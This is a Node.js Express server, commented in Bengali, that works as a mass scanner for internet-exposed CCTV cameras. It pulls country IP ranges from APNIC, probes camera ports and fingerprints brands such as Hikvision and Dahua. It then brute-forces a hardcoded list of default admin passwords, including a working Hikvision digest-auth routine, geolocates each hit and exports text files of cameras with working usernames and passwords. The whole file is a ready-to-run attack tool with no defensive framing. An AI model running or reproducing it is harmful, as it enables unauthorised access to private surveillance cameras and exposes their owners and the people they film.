const express = require('express');
const cors = require('cors');
const net = require('net');
const http = require('http');
const crypto = require('crypto');

const app = express();
app.use(cors());
app.use(express.json());

// ========== কনফিগারেশন ==========
const PORTS = [80, 8080, 443, 554, 37777, 8000];
const TIMEOUT = 1500; // ms
const MAX_CONCURRENT = 20; // Vercel-এর জন্য নিরাপদ
const APNIC_URL = 'https://ftp.apnic.net/stats/apnic/delegated-apnic-latest';

// ৪৪টি দেশ (পাইথন টুল থেকে নেওয়া)
const COUNTRIES = {
  BD: 'Bangladesh', IN: 'India', CN: 'China', JP: 'Japan', SG: 'Singapore',
  PK: 'Pakistan', AU: 'Australia', NZ: 'New Zealand', VN: 'Vietnam', TH: 'Thailand',
  KR: 'South Korea', MY: 'Malaysia', PH: 'Philippines', ID: 'Indonesia',
  LK: 'Sri Lanka', NP: 'Nepal', KH: 'Cambodia', LA: 'Laos', MM: 'Myanmar',
  BN: 'Brunei', PG: 'Papua New Guinea', FJ: 'Fiji', SB: 'Solomon Islands',
  VU: 'Vanuatu', WS: 'Samoa', TO: 'Tonga', KI: 'Kiribati', TV: 'Tuvalu',
  MH: 'Marshall Islands', FM: 'Micronesia', PW: 'Palau', NR: 'Nauru',
  CK: 'Cook Islands', NU: 'Niue', TK: 'Tokelau', WF: 'Wallis and Futuna',
  AS: 'American Samoa', GU: 'Guam', MP: 'Northern Mariana Islands',
  VI: 'US Virgin Islands', PR: 'Puerto Rico', UM: 'US Minor Outlying Islands',
  HK: 'Hong Kong', MO: 'Macau', TW: 'Taiwan'
};

// ডিফল্ট ক্রেডেনশিয়াল (পাইথন টুল থেকে নেওয়া)
const DEFAULT_CREDS = [
  { user: 'admin', pass: 'admin123' },
  { user: 'admin', pass: 'admin1234' },
  { user: 'admin', pass: 'admin12345' },
  { user: 'admin', pass: 'admin1122' },
  { user: 'admin', pass: '12345' },
  { user: 'admin', pass: '123456' },
  { user: 'admin', pass: 'password' },
  { user: 'admin', pass: 'Admin123' },
  { user: 'admin', pass: '12345678' },
  { user: 'admin', pass: '888888' },
  { user: 'admin', pass: '666666' },
];

// ব্র্যান্ড সিগনেচার (পাইথন টুল থেকে নেওয়া)
const BRAND_SIGNATURES = [
  { pattern: /Hikvision/i, brand: 'HIK Vision Camera' },
  { pattern: /Dahua/i, brand: 'Anjhua-Dahua Technology Camera' },
  { pattern: /TP-Link/i, brand: 'TP-Link Camera' },
  { pattern: /Xiaomi/i, brand: 'Xiaomi Camera' },
  { pattern: /Axis/i, brand: 'Axis Camera' },
  { pattern: /Sony/i, brand: 'Sony Camera' },
  { pattern: /Panasonic/i, brand: 'Panasonic Camera' },
  { pattern: /Bosch/i, brand: 'Bosch Camera' },
  { pattern: /Samsung/i, brand: 'Samsung Camera' },
  { pattern: /Vivotek/i, brand: 'Vivotek Camera' },
];

// ========== ইন-মেমরি স্টোর ==========
let foundCameras = [];
let validCameras = [];
let stats = { scanned: 0, found: 0, byBrand: {} };
let countryIpRanges = {};

// ========== হেল্পার ফাংশন ==========

// এপিএনআইসি থেকে আইপি রেঞ্জ ফেচ
async function fetchAPNICRanges(countryCode) {
  try {
    const response = await new Promise((resolve, reject) => {
      http.get(APNIC_URL, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
      }).on('error', reject);
    });
    const lines = response.split('\n');
    const ranges = [];
    for (const line of lines) {
      if (line.startsWith('apnic|' + countryCode + '|ipv4|')) {
        const parts = line.split('|');
        const ip = parts[3];
        const count = parseInt(parts[4]);
        if (ip && count) {
          // সিidর ফরম্যাটে কনভার্ট
          const cidr = Math.floor(32 - Math.log2(count));
          ranges.push({ ip, cidr, count });
        }
      }
    }
    return ranges;
  } catch (e) {
    console.error('APNIC fetch error:', e);
    return [];
  }
}

// সিidর থেকে আইপি লিস্ট জেনারেট
function cidrToIPs(ip, cidr, limit = 10) {
  const ips = [];
  const parts = ip.split('.').map(Number);
  const mask = ~0 << (32 - cidr);
  const base = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3];
  const start = base & mask;
  const end = start | ~mask;
  for (let i = 0; i < Math.min(limit, end - start + 1); i++) {
    const ipInt = start + i;
    ips.push(`${(ipInt >> 24) & 255}.${(ipInt >> 16) & 255}.${(ipInt >> 8) & 255}.${ipInt & 255}`);
  }
  return ips;
}

// জিও লোকেশন (ip-api.com)
async function getGeo(ip) {
  try {
    const url = `http://ip-api.com/json/${ip}?fields=country,regionName,city,lat,lon`;
    const data = await new Promise((resolve, reject) => {
      http.get(url, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try { resolve(JSON.parse(body)); } catch(e) { reject(e); }
        });
      }).on('error', reject);
    });
    if (data && data.country) {
      return `${data.country} (${data.city || data.regionName || 'Unknown'})`;
    }
    return 'Unknown';
  } catch {
    return 'Unknown';
  }
}

// পোর্ট ওপেন চেক (রিয়েল টিসিপি)
function isPortOpen(ip, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    const timer = setTimeout(() => {
      socket.destroy();
      resolve(false);
    }, TIMEOUT);
    socket.on('connect', () => {
      clearTimeout(timer);
      socket.destroy();
      resolve(true);
    });
    socket.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
    socket.connect(port, ip);
  });
}

// এইচটিটিপি রিকোয়েস্ট (বেসিক অথ সহ)
function httpRequest(ip, port, path = '/', auth = null, method = 'GET') {
  return new Promise((resolve) => {
    const options = {
      hostname: ip,
      port: port,
      path: path,
      method: method,
      timeout: TIMEOUT,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    };
    if (auth) {
      options.headers['Authorization'] = 'Basic ' + Buffer.from(`${auth.user}:${auth.pass}`).toString('base64');
    }
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, body: data });
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.end();
  });
}

// হিকভিশন ডাইজেস্ট অথেনটিকেশন (পাইথন টুলের লজিক)
async function tryHikvisionDigest(ip, port, cred) {
  try {
    // চ্যালেঞ্জ নেওয়া
    const options = {
      hostname: ip,
      port: port,
      path: '/ISAPI/Security/userCheck',
      method: 'GET',
      timeout: TIMEOUT,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    };
    const challenge = await new Promise((resolve) => {
      const req = http.request(options, (res) => {
        const authHeader = res.headers['www-authenticate'];
        resolve(authHeader || null);
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { req.destroy(); resolve(null); });
      req.end();
    });
    if (!challenge) return false;
    
    const realm = challenge.match(/realm="([^"]+)"/)?.[1] || '';
    const nonce = challenge.match(/nonce="([^"]+)"/)?.[1] || '';
    if (!realm || !nonce) return false;
    
    const uri = '/ISAPI/Security/userCheck';
    const nc = '00000001';
    const cnonce = 'abc123';
    const qop = 'auth';
    const ha1 = crypto.createHash('md5').update(`${cred.user}:${realm}:${cred.pass}`).digest('hex');
    const ha2 = crypto.createHash('md5').update(`GET:${uri}`).digest('hex');
    const response = crypto.createHash('md5').update(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`).digest('hex');
    const authHeader = `Digest username="${cred.user}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}", qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;
    
    // অথ সহ রিকোয়েস্ট
    const authOptions = {
      hostname: ip,
      port: port,
      path: '/ISAPI/Security/userCheck',
      method: 'GET',
      timeout: TIMEOUT,
      headers: {
        'Authorization': authHeader,
        'User-Agent': 'Mozilla/5.0'
      }
    };
    const result = await new Promise((resolve) => {
      const req = http.request(authOptions, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({ statusCode: res.statusCode, body: data });
        });
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { req.destroy(); resolve(null); });
      req.end();
    });
    return result && result.statusCode === 200;
  } catch {
    return false;
  }
}

// ব্র্যান্ড ডিটেক্ট
function detectBrand(body, headers) {
  const serverHeader = headers?.['server'] || '';
  const fullText = (body || '') + ' ' + serverHeader;
  for (const sig of BRAND_SIGNATURES) {
    if (sig.pattern.test(fullText)) {
      return sig.brand;
    }
  }
  // হিকভিশন স্পেশাল চেক
  if (fullText.includes('/isapi/') || fullText.toLowerCase().includes('hikvision')) {
    return 'HIK Vision Camera';
  }
  return 'Unknown Camera';
}

// একটি আইপি/পোর্ট স্ক্যান (রিয়েল)
async function scanIP(ip, port, countryCode = null) {
  const open = await isPortOpen(ip, port);
  if (!open) return null;

  const response = await httpRequest(ip, port, '/');
  if (!response) return null;

  let brand = detectBrand(response.body, response.headers);
  
  // যদি আননোন হয়, পোর্টের ভিত্তিতে অনুমান
  if (brand === 'Unknown Camera') {
    if ([37777, 554].includes(port)) {
      brand = 'Anjhua-Dahua Technology Camera';
    }
  }

  const geo = await getGeo(ip);

  // ক্রেডেনশিয়াল টেস্ট
  let validCred = null;
  for (const cred of DEFAULT_CREDS) {
    let success = false;
    if (brand === 'HIK Vision Camera') {
      success = await tryHikvisionDigest(ip, port, cred);
    } else {
      const authRes = await httpRequest(ip, port, '/', cred);
      if (authRes && authRes.statusCode === 200) {
        success = true;
      }
    }
    if (success) {
      validCred = cred;
      break;
    }
  }

  return {
    ip,
    port,
    brand,
    geo,
    username: validCred ? validCred.user : null,
    password: validCred ? validCred.pass : null,
    countryCode
  };
}

// একাধিক আইপি স্ক্যান (কনকারেন্সি কন্ট্রোল সহ)
async function scanIPs(ipList, countryCode = null) {
  const results = [];
  const chunks = [];
  for (let i = 0; i < ipList.length; i += MAX_CONCURRENT) {
    chunks.push(ipList.slice(i, i + MAX_CONCURRENT));
  }
  for (const chunk of chunks) {
    const promises = chunk.map(async (ip) => {
      let found = false;
      for (const port of PORTS) {
        const cam = await scanIP(ip, port, countryCode);
        if (cam) {
          found = true;
          results.push(cam);
          foundCameras.push(cam);
          if (cam.username && cam.password) {
            validCameras.push(cam);
            stats.byBrand[cam.brand] = (stats.byBrand[cam.brand] || 0) + 1;
          }
          break;
        }
      }
      stats.scanned++;
    });
    await Promise.all(promises);
  }
  stats.found += results.length;
  return results;
}

// ========== এপিআই এন্ডপয়েন্ট ==========

// ১. কান্ট্রি লিস্ট
app.get('/api/countries', (req, res) => {
  res.json({ countries: COUNTRIES });
});

// ২. কান্ট্রি আইপি রেঞ্জ ফেচ
app.post('/api/fetch-ranges', async (req, res) => {
  const { countryCode } = req.body;
  if (!countryCode || !COUNTRIES[countryCode]) {
    return res.status(400).json({ error: 'Invalid country code' });
  }
  const ranges = await fetchAPNICRanges(countryCode);
  countryIpRanges[countryCode] = ranges;
  res.json({ ranges, count: ranges.length });
});

// ৩. র্যান্ডম স্ক্যান (কান্ট্রি ভিত্তিক)
app.post('/api/scan/random', async (req, res) => {
  const { countryCode } = req.body;
  if (!countryCode || !COUNTRIES[countryCode]) {
    return res.status(400).json({ error: 'Country code required' });
  }
  
  // এপিএনআইসি থেকে রেঞ্জ ফেচ
  let ranges = countryIpRanges[countryCode];
  if (!ranges || ranges.length === 0) {
    ranges = await fetchAPNICRanges(countryCode);
    countryIpRanges[countryCode] = ranges;
  }
  
  let ips = [];
  if (ranges.length > 0) {
    // র্যান্ডম ৫টি রেঞ্জ থেকে ২টি করে আইপি
    const shuffled = ranges.sort(() => Math.random() - 0.5);
    for (let i = 0; i < Math.min(5, shuffled.length); i++) {
      const range = shuffled[i];
      const generated = cidrToIPs(range.ip, range.cidr, 2);
      ips = ips.concat(generated);
    }
  }
  // যদি কোনো আইপি না পাওয়া যায়, র্যান্ডম জেনারেট
  if (ips.length === 0) {
    for (let i = 0; i < 10; i++) {
      ips.push(`${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`);
    }
  }
  
  const found = await scanIPs(ips, countryCode);
  res.json({
    summary: `Scanned ${ips.length} IPs from ${COUNTRIES[countryCode]}, found ${found.length} cameras.`,
    found,
    valid: validCameras,
    stats,
    country: COUNTRIES[countryCode]
  });
});

// ৪. আইপি রেঞ্জ স্ক্যান
app.post('/api/scan/range', async (req, res) => {
  const { range } = req.body;
  if (!range) return res.status(400).json({ error: 'Range required' });

  let ips = [];
  try {
    if (range.includes('/')) {
      const parts = range.split('/');
      const base = parts[0];
      const cidr = parseInt(parts[1]);
      if (!isNaN(cidr)) {
        ips = cidrToIPs(base, cidr, 20);
      }
    } else if (range.includes('-')) {
      const [start, end] = range.split('-');
      const startParts = start.split('.');
      const endParts = end.split('.');
      const sLast = parseInt(startParts[3]);
      const eLast = parseInt(endParts[3]);
      for (let i = sLast; i <= Math.min(eLast, sLast + 20); i++) {
        ips.push(`${startParts[0]}.${startParts[1]}.${startParts[2]}.${i}`);
      }
    } else {
      ips = [range];
    }
  } catch (e) {
    return res.status(400).json({ error: 'Invalid range format' });
  }

  const found = await scanIPs(ips);
  res.json({
    summary: `Scanned ${ips.length} IPs from range, found ${found.length}.`,
    found,
    valid: validCameras,
    stats
  });
});

// ৫. সেভ করা ক্যামেরাগুলোর ক্রেডেনশিয়াল যাচাই
app.post('/api/validate', async (req, res) => {
  const toValidate = foundCameras.filter(c => !c.username);
  const newlyValid = [];
  for (const cam of toValidate) {
    for (const cred of DEFAULT_CREDS) {
      let success = false;
      if (cam.brand === 'HIK Vision Camera') {
        success = await tryHikvisionDigest(cam.ip, cam.port, cred);
      } else {
        const authRes = await httpRequest(cam.ip, cam.port, '/', cred);
        if (authRes && authRes.statusCode === 200) success = true;
      }
      if (success) {
        cam.username = cred.user;
        cam.password = cred.pass;
        validCameras.push(cam);
        stats.byBrand[cam.brand] = (stats.byBrand[cam.brand] || 0) + 1;
        newlyValid.push(cam);
        break;
      }
    }
  }
  res.json({ valid: newlyValid, stats });
});

// ৬. ভ্যালিড ক্যামেরার তালিকা
app.get('/api/valid/list', (req, res) => {
  res.json({ valid: validCameras, stats });
});

// ৭. ক্লিয়ার সব ডেটা
app.post('/api/clear', (req, res) => {
  foundCameras = [];
  validCameras = [];
  stats = { scanned: 0, found: 0, byBrand: {} };
  res.json({ success: true });
});

// ৮. রিপোর্ট ডাউনলোড (টেক্সট ফাইল)
app.get('/api/download/:type', (req, res) => {
  const { type } = req.params;
  let content = '';
  let filename = '';
  if (type === 'found') {
    content = foundCameras.map(c => 
      `Camera Type: ${c.brand}\nIP: ${c.ip}:${c.port}\nGeo: ${c.geo}\n${c.username ? 'Credentials: ' + c.username + ':' + c.password : 'No credentials'}\n---`
    ).join('\n');
    filename = 'CCTV_Found.txt';
  } else if (type === 'valid') {
    content = validCameras.map(c => 
      `Camera Type: ${c.brand}\nIP: ${c.ip}:${c.port}\nUsername: ${c.username}\nPassword: ${c.password}\nGeo: ${c.geo}\n---`
    ).join('\n');
    filename = 'ValidCamera.txt';
  } else {
    return res.status(400).json({ error: 'Invalid type' });
  }
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.send(content);
});

module.exports = app;
